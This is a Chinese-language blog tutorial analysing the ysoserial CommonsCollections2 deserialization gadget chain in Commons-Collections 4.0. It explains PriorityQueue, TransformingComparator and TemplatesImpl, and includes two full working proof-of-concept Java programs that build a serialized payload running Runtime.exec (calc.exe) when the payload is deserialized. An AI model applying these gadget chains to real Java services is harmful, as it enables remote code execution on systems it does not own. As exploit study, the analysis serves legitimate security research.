## ysoserial_CommonCollections2_Transformer/TemplatesImpl

本机环境：

JDK版本：jdk1.7u_51

CC版本：Commons-Collections 4.0

### 调用链

```
Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
```

### 基础

#### Javassist

`Javassist`是一个开源的分析、编辑和创建Java字节码的类库；相比ASM，`Javassist`提供了更加简单便捷的API，使用`Javassist`我们可以像写Java代码一样直接插入Java代码片段，让我们不再需要关注Java底层的字节码的和栈操作，仅需要学会如何使用`Javassist`的API即可实现字节码编辑

`Javassist`为我们提供了类似于Java反射机制的API，如：[CtClass](http://www.javassist.org/html/javassist/CtClass.html)，[CtConstructor](http://www.javassist.org/html/javassist/CtConstructor.html)、[CtMethod](http://www.javassist.org/html/javassist/CtMethod.html)、[CtField](http://www.javassist.org/html/javassist/CtField.html)与Java反射的`Class`、`Constructor`、`Method`、`Field`非常的类似。

| 类            | 描述                                                         |
| ------------- | ------------------------------------------------------------ |
| ClassPool     | ClassPool是一个存储CtClass的容器，如果调用`get`方法会搜索并创建一个表示该类的CtClass对象 |
| CtClass       | CtClass表示的是从ClassPool获取的类对象，可对该类就行读写编辑等操作 |
| CtMethod      | 可读写的类方法对象                                           |
| CtConstructor | 可读写的类构造方法对象                                       |
| CtField       | 可读写的类成员变量对象                                       |

该类库的优点在于简单 , 快速 , 直接使用 Java 编码格式就能动态改变类的结构或动态生成类 , 而不需要了解 JVM 指令 ，这里我们主要关注它如何动态更改字节码

```java
import javassist.*;


public class javassit_test {
    public static void createclass() throws Exception {
		//查找系统默认路径( JVM类搜索路径 )来搜索需要的类
        ClassPool pool = ClassPool.getDefault();
        //获取实例对象
        CtClass cc = pool.get(javassit_test.class.getName());
        //执行系统命令，添加内容为完整java源代码，引号要转义
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        // 创建 static 代码块，并插入代码
        cc.makeClassInitializer().insertBefore(cmd);
        //设置类名
        String randomClassName = "Snakin" + System.nanoTime();
        cc.setName(randomClassName);
        // 写入.class 文件
        cc.writeFile();
        //直接获取类并实例化
        //cc.toClass().newInstance();
    }

    public static void main(String[] args) {
        try {
            createclass();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

运行后在当前目录下生成clsss文件

![image-20220330143024103](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220330143024103.png)

动态生成的类在我们原有类的基础上添加了静态代码块 , 并注入了新的内容 . 如果我们可以加载新生成的类 ， 那么就会执行静态代码块中的内容 , 执行指定的恶意代码 。

直接实例化对象执行代码：

![image-20220330143401594](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220330143401594.png)

#### PriorityQueue 优先级队列

PriorityQueue 优先级队列是基于优先级堆（a priority heap）的一种特殊队列，他给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取，**队列中每次插入或删除元素时 , 都会根据比较器( Comparator )对队列进行调整**。默认情况下，优先级队列会根据自然顺序对元素进行排序。**当指定了比较器后 , 优先级队列会根据比较器的定义对元素进行排序**。

放入PriorityQueue的元素，必须实现 Comparable 接口，PriorityQueue  会根据元素的排序顺序决定出队的优先级。如果没有实现 Comparable 接口，PriorityQueue 还允许我们提供一个  Comparator 对象来判断两个元素的顺序。

PriorityQueue 支持反序列化，在重写的 readObject 方法中，将数据反序列化到 `queue` 中之后，会调用 `heapify()` 方法来对数据进行排序。

![image-20220330153109043](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220330153109043.png)

`heapify()` 方法调用 `siftDown()` 方法，在 comparator 属性不为空的情况下，调用 `siftDownUsingComparator()` 方法

![image-20220330154746794](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220330154746794.png)

在 `siftDownUsingComparator()` 方法中，会调用 comparator 的 `compare()` 方法来进行优先级的比较和排序。

![image-20220330154829798](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220330154829798.png)

#### TransformingComparator

TransformingComparator 是触发这个漏洞的一个关键点，他将 Transformer 执行点和 PriorityQueue 触发点连接了起来。

`TransformingComparator`是一个修饰器，和CC1中的`ChainedTransformer`类似。

![image-20220330155309785](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220330155309785.png)

在`compare` 方法中会触发 `this.transformer` 的 `transform`方法，与cc1类似，如果我们可以控制传入的transformer属性，就能进行可控的反射调用。

### POC分析

看到了 Transformer 对象，很容易联想到cc1的攻击流程，继续使用 ChainedTransformer 调用 InvokerTransformer 来触发恶意操作。

```java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class CommonCollections2 {
    public static void main(String[] args) throws Exception{
        ChainedTransformer chain = new ChainedTransformer(new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}));

        TransformingComparator comparator = new TransformingComparator(chain);

        PriorityQueue queue = new PriorityQueue(1);
        queue.add(1);
        queue.add(2);

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue,comparator);

        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(queue);


        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        fin.readObject();

    }
}
```

这里我们选择用PriorityQueue来触发`TransformingComparator.compare()`，根据上面的基础知识，我们可以通过反射来设置queue[i]的值来达到控制queue[i]内容的目的，继而触发执行恶意语句。

细节问题：

- 为什么要add两个值？

![image-20220331205941347](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220331205941347.png)

这里往queue中add两个值，是为了让其size>1，只有size>1才能使的i>0，才能进入siftDown这个方法中，完成后面的链。

- 为什么要在add之后才通过反射修改comparator的值?

![image-20220331210139074](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220331210139074.png)

add调用了offer方法，offer方法调用了siftUp方法：

![image-20220331210233359](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220331210233359.png)

这里需要保证comparator的值为null，才能够正常的添加元素进queue

ysoserial 的 CC2 没有使用 ChainedTransformer，而直接使用了 InvokerTransformer 配合 TemplatesImpl 直接加载恶意类的 bytecode。由于上面的poc只能执行命令，但yso的cc2能够执行代码，危害更大，我们来分析一下它的POC：

```java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class CommonCollections2_yso {

    public static void main(String[] args) throws Exception {
        Constructor constructor = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer").getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance("newTransformer");

        TransformingComparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(1);

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        // 创建 static 代码块，并插入代码
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
        // 写入.class 文件
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCodes);
        // 进入 defineTransletClasses() 方法需要的条件
        setFieldValue(templates, "_name", "name");
        setFieldValue(templates, "_class", null);

        Object[] queue_array = new Object[]{templates,1};

        Field queue_field = Class.forName("java.util.PriorityQueue").getDeclaredField("queue");
        queue_field.setAccessible(true);
        queue_field.set(queue,queue_array);

        Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size");
        size.setAccessible(true);
        size.set(queue,2);


        Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        comparator_field.setAccessible(true);
        comparator_field.set(queue,comparator);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc2"));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc2"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }

    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }


}
```

我们通过`InvokerTransformer#transform`的反射来调用`TemplatesImpl#newtransformer`，那么它是如何做到执行我们的命令的呢？

![image-20220331212712502](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220331212712502.png)

在其newTransformer中调用了getTransletInstance方法：

![image-20220331213239449](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220331213239449.png)

跟进defineTransletClasses方法：

![image-20220331213456174](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220331213456174.png)

这里通过`loader.defineClass`的方式将bytecodes还原为Class，接着在外面又调用了`_class[_transletIndex].newInstance`方法实例化还原的Class。此时static语句块成功执行。

总结一下TemplatesImpl的利用方式：

- TemplatesImpl 的属性 `_bytecodes` 存储了类字节码
- TemplatesImpl 类的部分方法可以使用这个类字节码去实例化这个类，这个类的父类需是 AbstractTranslet
- 在这个类的无参构造方法或静态代码块中写入恶意代码，再借 TemplatesImpl 之手实例化这个类触发恶意代码

这个POC的触发逻辑：

- 创建恶意的 TemplatesImpl 对象，写入 `_bytecodes`、`_name` 属性，完成调用 newTransformer 方法触发恶意类的实例化的条件。
- 创建 PriorityQueue，由于 TemplatesImpl 不是 Comparable 对象，需要反射将恶意的 TemplatesImpl 对象写入到 PriorityQueue 的 queue 中。
- 使用 InvokerTransformer （调用被装饰对象的 newTransformer 方法）创建 TransformingComparator ，并将其赋予到 PriorityQueue 中。

![image-20220331213813331](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220331213813331.png)



参考：

https://www.guildhab.top/2020/08/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e8-%e8%a7%a3%e5%af%86-ysoserial-commonscollections2-pop-chains/#header-id-11

https://paper.seebug.org/1242/#javassit

https://su18.org/post/ysoserial-su18-2/#commonscollections2




